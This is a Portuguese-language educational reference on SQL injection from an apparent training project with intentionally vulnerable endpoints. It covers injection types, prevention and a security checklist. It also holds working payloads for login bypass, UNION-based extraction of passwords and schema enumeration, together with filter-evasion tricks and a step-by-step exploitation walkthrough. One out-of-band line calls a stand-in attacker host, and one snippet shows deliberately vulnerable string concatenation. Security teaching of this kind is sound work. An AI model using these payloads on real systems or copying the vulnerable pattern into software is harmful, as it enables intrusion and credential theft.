# 💉 Referência de SQL Injection

> Material de estudo sobre SQL Injection para fins educacionais

---

## ⚠️ Aviso Legal

SQL Injection é uma técnica de ataque. Praticar em sistemas sem autorização é **CRIME**.

Este material é **APENAS** para:
- Aprendizado em ambientes controlados
- Testes de segurança autorizados
- Compreensão de vulnerabilidades

---

## 📖 O que é SQL Injection?

SQL Injection é uma técnica onde o atacante insere código SQL malicioso através de campos de entrada da aplicação.

### Código Vulnerável (NÃO FAÇA ISSO!)

```javascript
// ❌ VULNERÁVEL - Concatenação de strings
const username = req.body.username;
const sql = "SELECT * FROM users WHERE username = '" + username + "'";
```

### Código Seguro (FAÇA ISSO!)

```javascript
// ✅ SEGURO - Prepared Statement
const username = req.body.username;
const sql = "SELECT * FROM users WHERE username = ?";
const result = await db.execute(sql, [username]);
```

---

## 🔍 Tipos de SQL Injection

### 1. In-band SQLi (Clássica)

O resultado aparece diretamente na resposta.

#### Error-based
Explora mensagens de erro para obter informações.

```sql
' OR 1=1 --
```

#### Union-based
Combina resultados de outra query.

```sql
' UNION SELECT username, password FROM users --
```

### 2. Blind SQLi

O resultado não aparece diretamente, mas pode ser inferido.

#### Boolean-based
Diferencia respostas verdadeiras de falsas.

```sql
' AND 1=1 --   (verdadeiro)
' AND 1=2 --   (falso)
```

#### Time-based
Usa delays para inferir informações.

```sql
' AND SLEEP(5) --
```

### 3. Out-of-band SQLi

Usa canais externos (DNS, HTTP) para exfiltrar dados.

```sql
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file') --
```

---

## 🛠️ Payloads Comuns

### Autenticação Bypass

```sql
-- Ignorar verificação de senha
admin' --
admin' #
admin'/*

-- OR injection
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
' OR 1=1 --
" OR 1=1 --

-- Sempre verdadeiro
' OR 'x'='x
' OR ''='
```

### Descoberta de Estrutura

```sql
-- Número de colunas (incrementar até não dar erro)
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
...

-- UNION para descobrir colunas visíveis
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

### Extração de Dados

```sql
-- Listar tabelas (MySQL)
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Listar colunas
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

-- Extrair dados
' UNION SELECT username, password FROM users --
```

### MySQL Específico

```sql
-- Versão
' UNION SELECT @@version, NULL --

-- Banco atual
' UNION SELECT database(), NULL --

-- Usuário atual
' UNION SELECT user(), NULL --

-- Listar todos os bancos
' UNION SELECT schema_name, NULL FROM information_schema.schemata --
```

---

## 📝 Passo a Passo de Exploração

### 1. Detectar Vulnerabilidade

Teste com aspas simples:
```
'
```

Se der erro SQL, provavelmente é vulnerável.

### 2. Descobrir Número de Colunas

Use ORDER BY incrementando:
```sql
' ORDER BY 1 --    ✓ funciona
' ORDER BY 2 --    ✓ funciona
' ORDER BY 3 --    ✓ funciona
' ORDER BY 4 --    ✗ erro
```
Conclusão: 3 colunas.

Ou use UNION SELECT com NULL:
```sql
' UNION SELECT NULL --           ✗ erro
' UNION SELECT NULL, NULL --     ✗ erro
' UNION SELECT NULL, NULL, NULL -- ✓ funciona
```

### 3. Identificar Colunas Visíveis

Substitua NULL por valores distintos:
```sql
' UNION SELECT 'a', 'b', 'c' --
```

Observe quais valores aparecem na resposta.

### 4. Extrair Informações do Banco

```sql
-- Versão e banco
' UNION SELECT @@version, database(), NULL --

-- Tabelas
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --
```

### 5. Extrair Dados Sensíveis

```sql
-- Estrutura da tabela users
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- Dados da tabela users
' UNION SELECT username, password, email FROM users --
```

---

## 🔧 Técnicas de Bypass

### Bypass de Filtros de Espaço

```sql
'/**/OR/**/1=1--
'+OR+1=1--
'%09OR%091=1--   (tab)
'%0aOR%0a1=1--   (newline)
```

### Bypass de Filtros de Palavras

```sql
-- Maiúsculas/Minúsculas
'uNiOn SeLeCt...
'UNION SELECT...

-- Comentários inline
'UN/**/ION SEL/**/ECT...

-- Double encoding
%252f%252a*/

-- Concatenação
'CONC'||'AT'
```

### Bypass de Aspas

```sql
-- Usar números ao invés de strings
' UNION SELECT 1,2,3 --

-- Hex encoding
' UNION SELECT 0x61646d696e --   (admin em hex)

-- CHAR function
' UNION SELECT CHAR(97,100,109,105,110) --
```

---

## 🛡️ Como Prevenir

### 1. Prepared Statements (Melhor Opção)

```javascript
// Node.js com mysql2
const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
);
```

### 2. ORM (Object-Relational Mapping)

```javascript
// Sequelize
const user = await User.findOne({
    where: { username: username }
});

// TypeORM
const user = await userRepository.findOne({
    where: { username: username }
});
```

### 3. Input Validation

```javascript
// Validar formato
if (!/^[a-zA-Z0-9_]+$/.test(username)) {
    throw new Error('Invalid username format');
}
```

### 4. Princípio do Menor Privilégio

```sql
-- Criar usuário com permissões limitadas
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_user'@'localhost';
-- NÃO dar DROP, DELETE em produção
```

### 5. Web Application Firewall (WAF)

- Detecta e bloqueia padrões maliciosos
- Camada adicional de proteção
- Não substitui código seguro!

---

## 📚 Recursos para Estudo

### Práticas Seguras
- [OWASP SQL Injection Prevention](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Ambientes de Prática (Legais!)
- DVWA (Damn Vulnerable Web Application)
- WebGoat
- HackTheBox
- TryHackMe
- SQLi-labs

### Ferramentas
- sqlmap (automação de SQLi)
- Burp Suite (interceptação de requisições)
- OWASP ZAP (scanner de vulnerabilidades)

---

## 🎯 Exercícios Práticos (Neste Projeto)

### Exercício 1: Bypass de Login
Endpoint: `POST /api/vulnerable/login`

Objetivo: Fazer login como admin sem saber a senha.

Dica: Use `admin' --` como username.

### Exercício 2: UNION Attack
Endpoint: `GET /api/vulnerable/search`

Objetivo: Listar as tabelas do banco.

Dica: Descubra o número de colunas primeiro.

### Exercício 3: Exfiltração de Dados
Endpoint: `GET /api/vulnerable/product/:id`

Objetivo: Obter as flags da tabela secret_flags.

Dica: Use UNION SELECT com o mesmo número de colunas.

### Exercício 4: Descoberta de Senhas
Endpoint: `GET /api/vulnerable/users`

Objetivo: Ver todas as senhas dos usuários.

Dica: O filtro de role é vulnerável.

---

## ✅ Checklist de Segurança

Antes de colocar em produção, verifique:

- [ ] Todas as queries usam prepared statements?
- [ ] Inputs são validados antes de usar?
- [ ] Usuário do banco tem permissões mínimas?
- [ ] Mensagens de erro não expõem detalhes internos?
- [ ] WAF está configurado?
- [ ] Logs de tentativas suspeitas estão ativos?
- [ ] Testes de segurança foram realizados?

---

*Este material é parte do projeto educacional Grão & Código*
